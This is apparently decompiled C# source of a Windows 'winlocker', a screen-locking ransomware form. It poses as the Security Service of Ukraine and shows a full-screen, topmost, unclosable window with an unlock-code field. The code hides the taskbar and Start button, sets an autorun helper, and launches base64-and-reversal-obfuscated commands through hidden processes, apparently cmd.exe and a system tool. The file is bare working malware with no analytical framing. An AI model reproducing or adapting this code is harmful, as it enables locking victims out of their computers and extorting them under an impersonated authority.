using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace MULTITAPPROCESSORLIB;

public class Form1 : Form
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private bool show;

	private IContainer components;

	private Panel panel1;

	private PictureBox pictureBox3;

	private Panel panel3;

	private TextBox textBox1;

	private Button button1;

	private Panel panel2;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	public string Reverse(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	[DllImport("user32.dll")]
	private static extern IntPtr FindWindow(string ClassName, string WindowName);

	[DllImport("user32.dll")]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string className, string windowName);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private void hbhi()
	{
		IntPtr intPtr = FindWindow(base64Decode("U2hlbGxfVHJheVduZA=="), null);
		IntPtr intPtr2 = FindWindow(base64Decode("QnV0dG9u"), null);
		if (intPtr != IntPtr.Zero)
		{
			ShowWindow(intPtr, show ? 5 : 0);
		}
		if (intPtr2 != IntPtr.Zero)
		{
			ShowWindow(intPtr2, show ? 5 : 0);
		}
		show = !show;
	}

	public string base64Decode(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception("Error in base64Decode" + ex.Message);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		multitapADD multitapADD2 = new multitapADD();
		if (multitapADD2.TAPVerifier(1500))
		{
			multitapADD2.SETTAPDELAYVALUE(autorun: true);
			Process.Start(base64Decode(Reverse(base64Decode("PT1RWjRWbUxrMTJZ"))), base64Decode(Reverse(base64Decode("PT1RWjRWbUx5Vm1jdnhHYzRWR0l0bDJMZ1kyTGd3R2JwdDJhekZHZGdNMEw="))));
			hbhi();
		}
		Process process = new Process();
		process.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
		process.StartInfo.FileName = base64Decode(Reverse(base64Decode("PVVHZWw1aWNuMTJhekZHZA==")));
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		((Control)this).Focus();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_03cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d9: Expected O, but got Unknown
		//IL_0449: Unknown result type (might be due to invalid IL or missing references)
		//IL_0453: Expected O, but got Unknown
		//IL_04d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04db: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		panel1 = new Panel();
		pictureBox3 = new PictureBox();
		panel3 = new Panel();
		textBox1 = new TextBox();
		button1 = new Button();
		panel2 = new Panel();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		label1 = new Label();
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((Control)panel3).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).set_Anchor((AnchorStyles)0);
		((Control)panel1).set_BackColor(Color.LightSteelBlue);
		((Control)panel1).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panel1).get_Controls().Add((Control)(object)panel3);
		((Control)panel1).get_Controls().Add((Control)(object)panel2);
		((Control)panel1).set_Location(new Point(148, 62));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(640, 480));
		((Control)panel1).set_TabIndex(0);
		((Control)pictureBox3).set_BackColor(Color.PowderBlue);
		((Control)pictureBox3).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox3.BackgroundImage"));
		((Control)pictureBox3).set_BackgroundImageLayout((ImageLayout)2);
		((Control)pictureBox3).set_Location(new Point(0, 83));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(640, 318));
		pictureBox3.set_TabIndex(2);
		pictureBox3.set_TabStop(false);
		((Control)panel3).set_BackColor(Color.DarkSlateGray);
		((Control)panel3).get_Controls().Add((Control)(object)textBox1);
		((Control)panel3).get_Controls().Add((Control)(object)button1);
		((Control)panel3).set_Location(new Point(0, 400));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(640, 80));
		((Control)panel3).set_TabIndex(1);
		((Control)textBox1).set_Location(new Point(248, 16));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(165, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)button1).set_Location(new Point(248, 42));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(165, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("СНЯТЬ БЛОКИРОВКУ");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)panel2).set_BackColor(Color.DarkSlateGray);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_Location(new Point(0, 0));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(640, 91));
		((Control)panel2).set_TabIndex(0);
		((Control)pictureBox2).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox2.BackgroundImage"));
		((Control)pictureBox2).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox2).set_Location(new Point(566, 11));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(71, 66));
		pictureBox2.set_TabIndex(2);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox1).set_Location(new Point(3, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(71, 66));
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(SystemColors.Control);
		((Control)label1).set_Location(new Point(121, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(396, 68));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("СЛУЖБА БЕЗОПАСНОСТИ \r\nУКРАИНЫ");
		label1.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Teal);
		((Form)this).set_ClientSize(new Size(928, 613));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((ISupportInitialize)pictureBox3).EndInit();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
